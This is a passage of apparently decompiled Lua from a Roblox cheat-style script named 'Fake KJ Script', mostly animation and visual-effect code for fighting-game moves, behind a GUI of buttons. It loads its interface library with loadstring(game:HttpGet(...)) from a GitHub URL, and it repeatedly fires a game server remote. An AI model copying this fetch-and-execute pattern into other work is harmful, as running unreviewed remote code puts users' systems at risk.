                                u3334:GetMarkerReachedSignal('BodyStrike'):Connect(function(p3351)
                                    if p3351 == 'FirstHits' then
                                        u3342(3)
                                    else
                                        u357({Intensity = 0.125})
                                        u3342(0.4375)
                                    end
                                end)
                            end)
                            task.delay(6, function()
                                u3343:Destroy()

                                if not p3331 then
                                    u3335:Destroy()
                                end
                            end)
                            u3335.Humanoid:GetPropertyChangedSignal('Health'):Connect(function()
                                if u3335.Head:FindFirstChild('BillboardGui') then
                                    u3335.Head.BillboardGui.TextLabel.Text = math.floor(tostring(u3335.Humanoid.Health)) .. '%'
                                end
                            end)

                            local v3352 = {
                                Character = _LocalPlayer3.Character,
                            }

                            u357({Intensity = 5})

                            local _Character10 = v3352.Character
                            local _ = _Character10.PrimaryPart
                            local v3354 = {}
                            local v3355, _ = u745(game.ReplicatedStorage.Resources.KJEffects, v3354, 5)
                            local u3356 = v3355.Smoke1:Clone()

                            u3356.CFrame = _Character10:GetPivot() * CFrame.new(-0.5975227355957031, -2.9642860889434814, 0.355224609375)
                            u3356.Parent = workspace.Thrown

                            local u3357 = QuickWeld(_Character10.Torso, u3356, _Character10.PrimaryPart, v3354)

                            task.delay(0.23, function()
                                u3357:Destroy()
                                u3356:Destroy()
                            end)

                            local v3358 = v3355.Ultikwind1:Clone()

                            v3358.CFrame = _Character10:GetPivot() * CFrame.new(-0.2682533264160156, -0.11571979522705078, -1.545166015625) * CFrame.Angles(0, 1.5707963267948966, 0)
                            v3358.Parent = workspace.Thrown

                            u10:Create(v3358, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                                CFrame = v3358.CFrame * CFrame.new(-0.2685203552246094, -0.11599993705749512, 1.2762451171875) * CFrame.Angles(3.141592653589793, 0, 0),
                            }):Play()
                            u10:Create(v3358.Mesh, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                                Scale = Vector3.new(0.5, 0.20000000298023224, 0.20000000298023224, 0),
                            }):Play()
                            u10:Create(v3358.Decal, TweenInfo.new(0.25, Enum.EasingStyle.Circular, Enum.EasingDirection.Out), {Transparency = 1}):Play()
                            u6:AddItem(v3358, 0.3)

                            local function u3376()
                                u357({Intensity = 3.5})

                                local v3359 = {
                                    Character = _LocalPlayer3.Character,
                                    MeshImpactOffset = _LocalPlayer3.Character.HumanoidRootPart.CFrame,
                                    DustOffset = _LocalPlayer3.Character.HumanoidRootPart.CFrame,
                                }
                                local _ = v3359.Character.PrimaryPart
                                local v3360, _ = u391(game.ReplicatedStorage.Resources.KJEffects, {}, 5)
                                local _CFrame16 = v3359.Character.PrimaryPart.CFrame
                                local _MeshImpactOffset = v3359.MeshImpactOffset
                                local _DustOffset = v3359.DustOffset
                                local v3364 = v3360['1and2']:Clone()

                                v3364.CFrame = _CFrame16
                                v3364.Parent = workspace.Thrown

                                local v3365 = v3360.hit1and2mesh:Clone()

                                v3365.CFrame = _MeshImpactOffset
                                v3365.Parent = workspace.Thrown

                                u10:Create(v3365.Mesh, TweenInfo.new(0.05), {
                                    Scale = Vector3.new(0, 40, 0, 0),
                                }):Play()
                                u10:Create(v3365, TweenInfo.new(0.05), {
                                    CFrame = v3365.CFrame * CFrame.new(-0.7975234985351563, 5.012999534606934, -12.126739501953125),
                                }):Play()
                                u6:AddItem(v3365, 0.6)

                                local v3366 = u371({
                                    orig = _DustOffset.Position + Vector3.yAxis,
                                    dir = Vector3.new(0, -5, 0, 0) * 4,
                                })

                                if v3366 then
                                    local v3367 = v3360['1and2smoke']:Clone()

                                    v3367.CFrame = _DustOffset
                                    v3367['1and2smoke']['1'].Color = ColorSequence.new(v3366.Color)
                                    v3367['1and2smoke']['2'].Color = ColorSequence.new(v3366.Color)
                                    v3367.Parent = workspace.Thrown

                                    local v3368, v3369, v3370 = pairs(v3367:GetDescendants())

                                    while true do
                                        local v3371

                                        v3370, v3371 = v3368(v3369, v3370)

                                        if v3370 == nil then
                                            break
                                        end
                                        if v3371:IsA('ParticleEmitter') then
                                            v3371:Emit(v3371:GetAttribute('EmitCount'), v3371:GetAttribute('EmitDelay'))
                                        end
                                    end
                                end

                                local v3372, v3373, v3374 = pairs(v3364:GetDescendants())

                                while true do
                                    local v3375

                                    v3374, v3375 = v3372(v3373, v3374)

                                    if v3374 == nil then
                                        break
                                    end
                                    if v3375:IsA('ParticleEmitter') then
                                        v3375:Emit(v3375:GetAttribute('EmitCount'), v3375:GetAttribute('EmitDelay'))
                                    end
                                end

                                u6:AddItem(v3364, 1)
                                u6:AddItem(v3365, 1)
                            end

                            task.delay(1.362, function()
                                u3376()
                            end)
                            task.delay(1.679, function()
                                u3376()
                            end)

                            local v3377 = u3334

                            u3334.GetMarkerReachedSignal(v3377, 'Uppercut'):Connect(function()
                                u357({Intensity = 4})

                                local v3378 = {
                                    Character = _LocalPlayer3.Character,
                                    ShowaveCF = _LocalPlayer3.Character.HumanoidRootPart.CFrame * CFrame.new(0, 10, 0) * CFrame.Angles(0, 0, math.rad(90)),
                                    CF = _LocalPlayer3.Character.HumanoidRootPart.CFrame,
                                }
                                local _ = v3378.Character.PrimaryPart
                                local v3379, _ = u391(game.ReplicatedStorage.Resources.KJEffects, {}, 5)
                                local _CF = v3378.CF
                                local _ShowaveCF = v3378.ShowaveCF
                                local v3382 = v3379.uppercutimpact:Clone()

                                v3382.CFrame = _CF
                                v3382.Parent = workspace.Thrown

                                u10:Create(v3382, TweenInfo.new(0.06, Enum.EasingStyle.Circular, Enum.EasingDirection.Out), {
                                    CFrame = v3382.CFrame * CFrame.new(0, 7.076, 0),
                                }):Play()
                                u10:Create(v3382.Mesh, TweenInfo.new(0.06, Enum.EasingStyle.Circular, Enum.EasingDirection.Out), {
                                    Scale = Vector3.new(0.699999988079071, 0, 0, 0),
                                }):Play()

                                local v3383 = v3379.uppercutmesh:Clone()

                                v3383.CFrame = _ShowaveCF
                                v3383.Parent = workspace.Thrown

                                u10:Create(v3383, TweenInfo.new(0.25, Enum.EasingStyle.Circular, Enum.EasingDirection.Out), {
                                    CFrame = v3383.CFrame * CFrame.new(-11.931, 0, 0) * CFrame.Angles(-3.141592653589793, 0, 0),
                                }):Play()
                                u10:Create(v3383.Mesh, TweenInfo.new(0.25, Enum.EasingStyle.Circular, Enum.EasingDirection.Out), {
                                    Scale = Vector3.new(0, 0.6000000238418579, 0.6000000238418579, 0),
                                }):Play()
                                u10:Create(v3383.Decal, TweenInfo.new(0.25, Enum.EasingStyle.Circular, Enum.EasingDirection.Out), {Transparency = 1}):Play()

                                local v3384, v3385 = u371({
                                    orig = _CF.Position + Vector3.yAxis,
                                    dir = Vector3.new(0, -50, 0, 0),
                                })

                                if v3384 then
                                    local _Color = v3384.Color
                                    local v3387 = v3379.UPPERCUTSMOKE:Clone()

                                    v3387.Size = Vector3.new(5, 5, 5, 0)
                                    v3387.Position = v3385
                                    v3387.Parent = workspace.Thrown
                                    v3387.UPPERCUTSMOKE['1'].Color = ColorSequence.new(_Color)
                                    v3387.UPPERCUTSMOKE['2'].Color = ColorSequence.new(_Color)

                                    u205:EmitParticlesAlt(v3387)
                                    u6:AddItem(v3387, 2)
                                end

                                u6:AddItem(v3383, 1)
                                u6:AddItem(v3382, 1)
                            end)

                            local v3388 = u3334

                            u3334.GetMarkerReachedSignal(v3388, 'KickImpact'):Connect(function()
                                wait(0.1)
                                u3342(5)
                                u357({Intensity = 10})
                                u131()

                                if p3330 then
                                    task.wait(0.03)
                                    u3334:Stop()
                                    u3350:Stop()
                                    u3202(p3329, nil, _LocalPlayer3)
                                    u3335:Destroy()
                                else
                                    local v3389 = {
                                        Character = _LocalPlayer3.Character,
                                        ParticleOffset = _LocalPlayer3.Character.HumanoidRootPart.CFrame,
                                        MeshOffset = _LocalPlayer3.Character.HumanoidRootPart.CFrame,
                                    }
                                    local _ = v3389.Character.PrimaryPart
                                    local v3390, _ = u391(game.ReplicatedStorage.Resources.KJEffects, {}, 5)
                                    local _ParticleOffset = v3389.ParticleOffset
                                    local _MeshOffset = v3389.MeshOffset
                                    local v3393 = v3390.lastkick:Clone()

                                    v3393.CFrame = _ParticleOffset
                                    v3393.Parent = workspace.Thrown

                                    local v3394, v3395 = u371({
                                        orig = _ParticleOffset.Position + Vector3.yAxis,
                                        dir = Vector3.new(0, -50, 0, 0),
                                    })

                                    if v3394 then
                                        v3393.smoker.WorldPosition = v3395
                                        v3393.smoker.smoke.Color = ColorSequence.new(v3394.Color)
                                    else
                                        v3393.smoker:Destroy()
                                    end

                                    u205:EmitParticlesAlt(v3393)
                                    u6:AddItem(v3393, 2)

                                    local v3396 = v3390.lastkickframe:Clone()

                                    v3396.CFrame = _MeshOffset
                                    v3396.Parent = workspace.Thrown

                                    u10:Create(v3396.Mesh, TweenInfo.new(0.06, Enum.EasingStyle.Circular, Enum.EasingDirection.Out), {
                                        Scale = Vector3.new(1, 0, 0, 0),
                                    }):Play()
                                    u10:Create(v3396, TweenInfo.new(0.06, Enum.EasingStyle.Circular, Enum.EasingDirection.Out), {
                                        CFrame = v3396.CFrame * CFrame.Angles(3.141592653589793, 0, 0),
                                    }):Play()
                                    u6:AddItem(v3396, 0.4)
                                    shared.sfx({
                                        SoundId = 'rbxassetid://16945723339',
                                        Volume = 3,
                                        CFrame = u113().CFrame,
                                    }):Play()
                                end
                            end)

                            local v3397 = u3334

                            u3334.GetMarkerReachedSignal(v3397, 'DoSpin'):Connect(function()
                                u357({
                                    Last = 0.5,
                                    Intensity = 5,
                                })

                                local v3398 = _LocalPlayer3
                                local _ = v3398.Character.PrimaryPart
                                local v3399 = {}
                                local u3400, _ = u391(game.ReplicatedStorage.Resources.KJEffects, v3399, 5)
                                local _CFrame17 = v3398.Character.PrimaryPart.CFrame
                                local v3402 = v3398.Character.PrimaryPart.CFrame * CFrame.new(0, 0, 10)
                                local u3403 = {}

                                local function v3439(p3404, p3405)
                                    local v3406 = 6.283185307179586 / p3405

                                    for v3407 = 1, p3405 do
                                        local v3408 = 0.25
                                        local v3409 = 0.75
                                        local v3410 = u229
                                        local v3411

                                        if v3409 or not v3408 then
                                            v3411 = v3408
                                            v3408 = v3409
                                        else
                                            v3411 = 1
                                        end
                                        if not (v3408 or v3411) then
                                            v3411 = 0
                                            v3408 = 1
                                        end

                                        local v3412 = v3410:NextNumber(v3411, v3408)
                                        local v3413 = u3400.FloatingRock:Clone()
                                        local _Angles12 = CFrame.Angles
                                        local v3415 = 0
                                        local v3416 = -180
                                        local v3417 = 180
                                        local v3418 = u229
                                        local v3419

                                        if v3417 or not v3416 then
                                            v3419 = v3416
                                            v3416 = v3417
                                        else
                                            v3419 = 1
                                        end
                                        if not (v3416 or v3419) then
                                            v3419 = 0
                                            v3416 = 1
                                        end

                                        v3413.CFrame = p3404 * _Angles12(v3415, math.rad((v3418:NextNumber(v3419, v3416))), 0) * CFrame.new(0, 0, -10)
                                        v3413.Size = Vector3.new(v3412, v3412, v3412)
                                        v3413.Anchored = true
                                        v3413.CanCollide = false
                                        v3413.Massless = true
                                        v3413.CanQuery = false
                                        v3413.Parent = workspace.Thrown

                                        local v3420, v3421, v3422 = pairs(v3413:GetDescendants())
                                        local v3423 = v3407

                                        while true do
                                            local v3424

                                            v3422, v3424 = v3420(v3421, v3422)

                                            if v3422 == nil then
                                                break
                                            end
                                            if v3424:IsA('ParticleEmitter') then
                                                v3424.Enabled = true
                                            end
                                        end

                                        local v3425 = math.random(1, 2) == 1
                                        local v3426 = math.random(1, 2) == 1
                                        local v3427 = math.random(1, 2) == 1
                                        local v3428 = u3403
                                        local v3429 = {}
                                        local v3430 = v3406 * v3423
                                        local v3431 = 0.012421
                                        local v3432 = 0.75
                                        local v3433 = u229
                                        local v3434

                                        if v3432 or not v3431 then
                                            v3434 = v3431
                                            v3431 = v3432
                                        else
                                            v3434 = 1
                                        end
                                        if not (v3431 or v3434) then
                                            v3434 = 0
                                            v3431 = 1
                                        end

                                        v3429.CurrentAngle = math.clamp(v3430 + v3433:NextNumber(v3434, v3431), 0, 6.283185307179586)
                                        v3429.LastPosition = v3413.Position
                                        v3429.InverseAngleX = v3425
                                        v3429.InverseAngleZ = v3426
                                        v3429.InverseAngleY = v3427

                                        local v3435 = -0.1
                                        local v3436 = 0.1
                                        local v3437 = u229
                                        local v3438

                                        if v3436 or not v3435 then
                                            v3438 = v3435
                                            v3435 = v3436
                                        else
                                            v3438 = 1
                                        end
                                        if not (v3435 or v3438) then
                                            v3438 = 0
                                            v3435 = 1
                                        end

                                        v3429.YOffset = v3437:NextNumber(v3438, v3435)
                                        v3429.TossDirection = Vector3.zero
                                        v3428[v3413] = v3429
                                    end
                                end

                                local u3440 = u3400.RUNAROUNDWIND:Clone()

                                u3440.CFrame = _CFrame17
                                u3440.Parent = workspace.Thrown

                                u205:EnabledAllVisuals(u3440)

                                local u3441 = u3400.spinbeam:Clone()

                                u3441.CFrame = v3402
                                u3441.Parent = workspace.Thrown

                                u205:EnabledAllVisuals(u3441)
                                u10:Create(u3441.beam2.Beam, TweenInfo.new(0.66, Enum.EasingStyle.Circular, Enum.EasingDirection.Out), {TextureSpeed = 0}):Play()
                                u205:UnixConnection2(0.66, function(p3442)
                                    local v3443 = u205

                                    u3441.beam2.Beam.Transparency = NumberSequence.new((v3443:Lerp(0.5, 1, p3442)))
                                end)
                                task.delay(0.66, function()
                                    u205:DisableAllVisuals(u3440)
                                    u205:DisableAllVisuals(u3441)
                                    u6:AddItem(u3440, 1.5)
                                    u6:AddItem(u3441, 1.5)
                                end)
                                v3439(_CFrame17, u236(10, 14, true))

                                local u3444 = os.clock()
                                local u3445 = nil

                                u3445 = u12.RenderStepped:Connect(function(p3446)
                                    if os.clock() - u3444 <= 0.66 then
                                        local v3447, v3448, v3449 = pairs(u3403)

                                        while true do
                                            local v3450, v3451 = v3447(v3448, v3449)

                                            if v3450 == nil then
                                                break
                                            end

                                            v3449 = v3450

                                            local v3452 = (v3451.CurrentAngle + p3446 * 30) % 6.283185307179586
                                            local v3453

                                            if v3451.InverseAngleX then
                                                v3453 = -v3452 or v3452
                                            else
                                                v3453 = v3452
                                            end

                                            local v3454

                                            if v3451.InverseAngleY then
                                                v3454 = -v3452 or v3452
                                            else
                                                v3454 = v3452
                                            end

                                            local v3455

                                            if v3451.InverseAngleZ then
                                                v3455 = -v3452 or v3452
                                            else
                                                v3455 = v3452
                                            end

                                            local _YOffset = v3451.YOffset
                                            local v3457 = CFrame.new(_CFrame17.Position) * CFrame.new(math.cos(v3452) * 10, _YOffset, math.sin(v3452) * 10) * CFrame.Angles(math.cos(v3453), math.sin(v3454), (math.sin(v3455)))

                                            v3451.CurrentAngle = v3452
                                            v3450.CFrame = v3457
                                            v3451.TossDirection = (v3451.LastPosition - v3450.Position).Unit
                                            v3451.LastPosition = v3450.Position
                                        end
                                    else
                                        u3445:Disconnect()

                                        u3445 = nil

                                        local v3458, v3459, v3460 = pairs(u3403)

                                        while true do
                                            local u3461, v3462 = v3458(v3459, v3460)

                                            if u3461 == nil then
                                                break
                                            end

                                            v3460 = u3461
                                            u3461.Anchored = false
                                            u3461.CanCollide = true
                                            u3461.AssemblyLinearVelocity = -v3462.TossDirection * 50

                                            local v3463 = -30
                                            local v3464 = 30
                                            local v3465 = u229
                                            local v3466

                                            if v3464 or not v3463 then
                                                v3466 = v3463
                                                v3463 = v3464
                                            else
                                                v3466 = 1
                                            end
                                            if not (v3463 or v3466) then
                                                v3466 = 0
                                                v3463 = 1
                                            end

                                            local v3467 = v3465:NextNumber(v3466, v3463)
                                            local v3468 = -30
                                            local v3469 = 30
                                            local v3470 = u229
                                            local v3471

                                            if v3469 or not v3468 then
                                                v3471 = v3468
                                                v3468 = v3469
                                            else
                                                v3471 = 1
                                            end
                                            if not (v3468 or v3471) then
                                                v3471 = 0
                                                v3468 = 1
                                            end

                                            u3461.AssemblyAngularVelocity = Vector3.new(v3467, v3470:NextNumber(v3471, v3468), u236(-30, 30))

                                            task.delay(1, function()
                                                u10:Create(u3461, TweenInfo.new(0.45), {
                                                    Size = Vector3.zero,
                                                }):Play()
                                                u6:AddItem(u3461, 0.47)
                                            end)

                                            u3403[u3461] = nil
                                        end
                                    end
                                end)

                                table.insert(v3399, u3445)
                            end)

                            local v3472 = u3334

                            u3334.GetMarkerReachedSignal(v3472, 'BarageStart'):Connect(function()
                                local u3473 = u4.Resources.KJEffects.barrage:Clone()

                                u3473.Parent = workspace

                                local v3474, v3475, v3476 = pairs(u3473:GetChildren())

                                while true do
                                    local v3477

                                    v3476, v3477 = v3474(v3475, v3476)

                                    if v3476 == nil then
                                        break
                                    end

                                    v3477.Enabled = true
                                end

                                u3334:GetMarkerReachedSignal('BarageEnd'):Connect(function()
                                    u3473:Destroy()
                                end)

                                repeat
                                    task.wait()

                                    u3473.CFrame = _LocalPlayer3.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0.2, -1.5)
                                    u3473.CFrame = u3473.CFrame * CFrame.Angles(math.rad(25), 0, 0)

                                    local v3478 = u3473
                                until not u3473.IsDescendantOf(v3478, workspace)
                            end)
                        end
                        local function u3489(p3480)
                            u122()
                            u134()

                            local u3481 = false

                            _LocalPlayer3.Character:WaitForChild('Humanoid'):WaitForChild('Animator')

                            local v3482 = u706(u1077.Ravage.Startup, true)

                            v3482.Stopped:Connect(function()
                                if not u3481 then
                                    u140()
                                    u131()
                                end
                            end)
                            u363('rbxassetid://16945495411', _LocalPlayer3.Character.Torso, 2)
                            v3482:GetMarkerReachedSignal('Hitbox'):Connect(function()
                                task.wait(0.05)

                                local v3483 = Vector3.new(7, 7, 7)
                                local v3484 = DoHitbox({}, u201(), v3483, u113().CFrame + u113().CFrame.LookVector * v3483.Z * 0.75)

                                if v3484 and #v3484 > 0 then
                                    local v3485, v3486, v3487 = pairs(v3484)

                                    while true do
                                        local v3488

                                        v3487, v3488 = v3485(v3486, v3487)

                                        if v3487 == nil then
                                            break
                                        end
                                        if u3481 then
                                            return
                                        end

                                        u3481 = true

                                        u3479(v3488, p3480)
                                    end
                                end
                            end)
                        end

                        local v3490

                        if _G.Library then
                            v3490 = _G.Library
                        else
                            v3490 = loadstring(game:HttpGet('https://raw.githubusercontent.com/Tariviste/Kavo-Mobile/main/SourceCode'))()
                            _G.Library = v3490
                        end

                        local _FakeKJScriptmadebyTariviste = v3490.CreateLib('Fake KJ Script, made by @Tariviste', 'GrapeTheme')
                        local _KJ = _FakeKJScriptmadebyTariviste:NewTab('Base Moves'):NewSection('KJ')

                        _KJ:NewButton('Ravage', '', function()
                            if not u201():FindFirstChild('DoingMove') then
                                u3489()
                            end
                        end)
                        _KJ:NewButton('Swift Sweep', '', function()
                            if not u201():FindFirstChild('DoingMove') then
                                u2744()
                            end
                        end)
                        _KJ:NewButton('Collateral Ruin', '', function()
                            if not u201():FindFirstChild('DoingMove') then
                                u2661()
                            end
                        end)
                        _KJ:NewButton('Spiraling Storm', '', function()
                            if not u201():FindFirstChild('DoingMove') then
                                local v3493

                                if #u32 < 1 then
                                    v3493 = u201():Clone()
                                else
                                    v3493 = u32[math.random(1, #u32)]:Clone()
                                end

                                local v3494, v3495, v3496 = pairs(v3493:GetDescendants())

                                while true do
                                    local v3497

                                    v3496, v3497 = v3494(v3495, v3496)

                                    if v3496 == nil then
                                        break
                                    end
                                    if v3497:IsA('BodyMover') or v3497:IsA('Sound') then
                                        v3497:Destroy()
                                    end
                                end

                                shared.sfx({
                                    SoundId = 'rbxassetid://123788111427534',
                                    Parent = u201().Head,
                                    Volume = 1.25,
                                })

                                v3493.Parent = workspace

                                v3493:PivotTo(u201():GetPivot())

                                v3493.HumanoidRootPart.Anchored = false

                                u2526(v3493)
                            end
                        end)

                        local _KJ2 = _FakeKJScriptmadebyTariviste:NewTab('Ultimate Moves'):NewSection('KJ')

                        _KJ2:NewButton('Awakening 1', '', function()
                            if not u201():FindFirstChild('DoingMove') then
                                u122()
                                u2319()
                            end
                        end)
                        _KJ2:NewButton('Awakening 2', '', function()
                            if not u201():FindFirstChild('DoingMove') then
                                u122()
                                u2299()
                            end
                        end)
                        _KJ2:NewButton('Stoic Bomb', '', function()
                            if not u201():FindFirstChild('DoingMove') then
                                u122()
                                u2286()
                            end
                        end)
                        _KJ2:NewButton('20-20-20 Dropkick', '', function()
                            u3328()
                        end)
                        _KJ2:NewButton('Five Seasons', '', function()
                            u3043()
                        end)
                        _KJ2:NewButton('Unlimited Flex Works', '', function()
                            if not u201():FindFirstChild('DoingMove') then
                                u1654(_LocalPlayer3)
                            end
                        end)
                        _KJ2:NewButton("I'm done playing around", '', function()
                            shared.sfx({
                                SoundId = 'rbxassetid://132515779133572',
                                Parent = workspace,
                                Volume = 2.5,
                            }):Play()
                            task.delay(0.1, function()
                                u1076("I'm done playing around", 0.082)
                                wait(2.564)
                                u1076('This should end it all..', 0.0965, true)
                            end)
                        end)

                        local function u3502(p3499, p3500)
                            local _Tool2 = Instance.new('Tool')

                            _Tool2.Name = p3499
                            _Tool2.Parent = _LocalPlayer3.Backpack

                            _Tool2:SetAttribute('Skill', true)

                            _Tool2.RequiresHandle = false

                            _Tool2.Equipped:Connect(function()
                                p3500()
                            end)
                        end

                        local _Tools = _FakeKJScriptmadebyTariviste:NewTab('Tools')
                        local _Base = _Tools:NewSection('Base')

                        _Base:NewButton('Ravage', '', function()
                            u3502('Ravage', function()
                                if not u201():FindFirstChild('DoingMove') then
                                    u3489()
                                end
                            end)
                        end)
                        _Base:NewButton('Swift Sweep', '', function()
                            u3502('Swift Sweep', function()
                                if not u201():FindFirstChild('DoingMove') then
                                    u2744()
                                end
                            end)
                        end)
                        _Base:NewButton('Collateral Ruin', '', function()
                            u3502('Collateral Ruin', function()
                                if not u201():FindFirstChild('DoingMove') then
                                    u2661()
                                end
                            end)
                        end)
                        _Base:NewButton('Spiraling Storm', '', function()
                            u3502('Spiraling Storm', function()
                                if not u201():FindFirstChild('DoingMove') then
                                    local v3505

                                    if #u32 < 1 then
                                        v3505 = u201():Clone()
                                    else
                                        v3505 = u32[math.random(1, #u32)]:Clone()
                                    end

                                    local v3506, v3507, v3508 = pairs(v3505:GetDescendants())

                                    while true do
                                        local v3509

                                        v3508, v3509 = v3506(v3507, v3508)

                                        if v3508 == nil then
                                            break
                                        end
                                        if v3509:IsA('BodyMover') or v3509:IsA('Sound') then
                                            v3509:Destroy()
                                        end
                                    end

                                    shared.sfx({
                                        SoundId = 'rbxassetid://123788111427534',
                                        Parent = u201().Head,
                                        Volume = 1.25,
                                    })

                                    v3505.Parent = workspace

                                    v3505:PivotTo(u201():GetPivot())

                                    v3505.HumanoidRootPart.Anchored = false

                                    u2526(v3505)
                                end
                            end)
                        end)

                        local _Ultimate = _Tools:NewSection('Ultimate')

                        _Ultimate:NewButton('Stoic Bomb', '', function()
                            u3502('Stoic Bomb', function()
                                if not u201():FindFirstChild('DoingMove') then
                                    u122()
                                    u2286()
                                end
                            end)
                        end)
                        _Ultimate:NewButton('20-20-20 Dropkick', '', function()
                            u3502('20-20-20 Dropkick', function()
                                u3328()
                            end)
                        end)
                        _Ultimate:NewButton('Five Seasons', '', function()
                            u3502('Five Seasons', function()
                                u3043()
                            end)
                        end)
                        _Ultimate:NewButton('Unlimited Flex Works', '', function()
                            u3502('Unlimited Flex Works', function()
                                if not u201():FindFirstChild('DoingMove') then
                                    u1654(_LocalPlayer3)
                                end
                            end)
                        end)

                        local _OtherMoves = _FakeKJScriptmadebyTariviste:NewTab('Other Moves')
                        local _Moves = _OtherMoves:NewSection('Moves')

                        _Moves:NewButton('Spawn Animation', '', function()
                            if not u201():FindFirstChild('DoingMove') then
                                u1071()
                            end
                        end)
                        _Moves:NewButton('Dummy Counter', '', function()
                            if not u201():FindFirstChild('DoingMove') then
                                u1048(_LocalPlayer3, workspace.Live['Weakest Dummy'])
                            end
                        end)
                        _Moves:NewButton('Wall Combo', '', function()
                            if not u201():FindFirstChild('DoingMove') then
                                u885()
                            end
                        end)
                        _OtherMoves:NewSection('Concept Moves'):NewButton('Ravage Dropkick', '', function()
                            if not u201():FindFirstChild('DoingMove') then
                                u3489(true)
                            end
                        end)

                        local _SpawnAnim = _FakeKJScriptmadebyTariviste:NewTab('Spawn Animations'):NewSection('Spawn Anim')
                        local u3514 = 'Default'

                        _SpawnAnim:NewButton('Default', '', function()
                            u3514 = 'Default'
                        end)
                        _SpawnAnim:NewButton('KJ', '', function()
                            u3514 = 'KJ'
                        end);

                        ({}).KJ = 'rbxassetid://17325160621'
                        ({}).KJ = 'rbxassetid://17325174223'

                        _LocalPlayer3.CharacterAdded:Connect(function(p3515)
                            if u3514 ~= 'Default' then
                                spawn(function()
                                    for _ = 1, 200 do
                                        if u5.LocalPlayer.Character:FindFirstChild('Communicate') then
                                            local v3516 = {
                                                {
                                                    Goal = 'Disable Intro',
                                                },
                                            }

                                            u5.LocalPlayer.Character.Communicate:FireServer(unpack(v3516))
                                        end

                                        task.wait()
                                    end
                                end)
                                u1071(p3515)
                            end
                        end)

                        local _M1s = _FakeKJScriptmadebyTariviste:NewTab('M1s'):NewSection('M1s')
                        local u3518 = 'Default'

                        _M1s:NewButton('Default', '', function()
                            u3518 = 'Default'
                        end)
                        _M1s:NewButton('KJ', '', function()
                            u3518 = 'KJ'
                        end)

                        local u3519 = {
                            [2] = 'rbxassetid://17325510002',
                            [3] = 'rbxassetid://17325513870',
                            [4] = 'rbxassetid://17325522388',
                            [5] = 'rbxassetid://17325537719',
                        }
                        local u3520 = {
                            Saitama = {
                                'rbxassetid://10469493270',
                                'rbxassetid://10469630950',
                                'rbxassetid://10469639222',
                                'rbxassetid://10469643643',
                            },
                            Genos = {
                                'rbxassetid://13491635433',
                                'rbxassetid://13296577783',
                                'rbxassetid://13295919399',
                                'rbxassetid://13295936866',
                            },
                            Garou = {
                                'rbxassetid://13532562418',
                                'rbxassetid://13532600125',
                                'rbxassetid://13532604085',
                                'rbxassetid://13294471966',
                            },
                            Sonic = {
                                'rbxassetid://13370310513',
                                'rbxassetid://13390230973',
                                'rbxassetid://13378751717',
                                'rbxassetid://13378708199',
                            },
                            Metal = {
                                'rbxassetid://14004222985',
                                'rbxassetid://13997092940',
                                'rbxassetid://14001963401',
                                'rbxassetid://14136436157',
                            },
                            Atomic = {
                                'rbxassetid://15259161390',
                                'rbxassetid://15240216931',
                                'rbxassetid://15240176873',
                                'rbxassetid://15162694192',
                            },
                        }

                        local function v3527(p3521)
                            p3521:WaitForChild('Humanoid', 9000000000).Animator.AnimationPlayed:Connect(function(p3522)
                                task.wait(0.01)

                                if p3521:GetAttribute('Combo') and u3518 ~= 'Default' then
                                    local v3523, v3524, v3525 = pairs(u3520)

                                    while true do
                                        local v3526

                                        v3525, v3526 = v3523(v3524, v3525)

                                        if v3525 == nil then
                                            break
                                        end
                                        if table.find(v3526, p3522.Animation.AnimationId) then
                                            p3522:Stop()
                                            u706(u3519[p3521:GetAttribute('Combo')], true, nil, true)
                                        end
                                    end
                                end
                            end)
                        end

                        v3527(u5.LocalPlayer.Character)
                        u5.LocalPlayer.CharacterAdded:Connect(v3527)

                        local _Characters = _FakeKJScriptmadebyTariviste:NewTab('Characters')
                        local _Disguise = _Characters:NewSection('Disguise')
                        local u3530 = '22freshfrenchfries'

                        _Disguise:NewTextBox('Player Name', '', function(p3531)
                            u3530 = p3531
                        end)

                        local function u3548()
                            local v3532 = game:GetService('Players'):GetCharacterAppearanceAsync(game:GetService('Players'):GetUserIdFromNameAsync(u3530))
                            local u3533 = _LocalPlayer3
                            local v3534, v3535, v3536 = pairs(u3533.Character:GetChildren())

                            while true do
                                local v3537

                                v3536, v3537 = v3534(v3535, v3536)

                                if v3536 == nil then
                                    break
                                end
                                if v3537:IsA('Accessory') or v3537:IsA('Shirt') or (v3537:IsA('Pants') or v3537:IsA('CharacterMesh')) or (v3537:IsA('BodyColors') or v3537:IsA('ShirtGraphic')) then
                                    v3537:Destroy()
                                end
                            end

                            pcall(function()
                                u3533.Character.FakeHead:Destroy()
                            end)

                            local v3538, v3539, v3540 = pairs(u3533.Character.Head:GetChildren())

                            while true do
                                local v3541

                                v3540, v3541 = v3538(v3539, v3540)

                                if v3540 == nil then
                                    break
                                end
                                if v3541:IsA('SpecialMesh') and v3541:GetAttribute('FromMorph') == true then
                                    v3541:Destroy()
                                end
                            end

                            if u3533.Character.Head:FindFirstChild('face') then
                                u3533.Character.Head.face:Destroy()
                            end

                            local v3542, v3543, v3544 = pairs(v3532:GetChildren())

                            while true do
                                local v3545

                                v3544, v3545 = v3542(v3543, v3544)

                                if v3544 == nil then
                                    break
                                end
                                if v3545:IsA('Shirt') or v3545:IsA('Pants') or (v3545:IsA('BodyColors') or v3545:IsA('ShirtGraphic')) then
                                    v3545.Parent = u3533.Character
                                elseif v3545:IsA('Accessory') then
                                    v3545.Name = '#ACCESSORY_' .. v3545.Name
                                    v3545.Parent = u3533.Character
                                elseif v3545:IsA('SpecialMesh') then
                                    v3545:SetAttribute('FromMorph', true)

                                    v3545.Parent = u3533.Character.Head
                                elseif v3545.Name ~= 'R6' then
                                    if v3545.Name == 'R15' and u3533.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
                                        v3545:FindFirstChildOfClass('CharacterMesh').Parent = u3533.Character
                                    end
                                elseif u3533.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
                                    v3545:FindFirstChildOfClass('CharacterMesh').Parent = u3533.Character
                                end
                            end

                            if v3532:FindFirstChild('face') then
                                v3532.face.Parent = u3533.Character.Head
                            else
                                local _Decal30 = Instance.new('Decal')

                                _Decal30.Face = 'Front'
                                _Decal30.Name = 'face'
                                _Decal30.Texture = 'rbxasset://textures/face.png'
                                _Decal30.Transparency = 0
                                _Decal30.Parent = u3533.Character.Head
                            end

                            local _Parent3 = u3533.Character.Parent

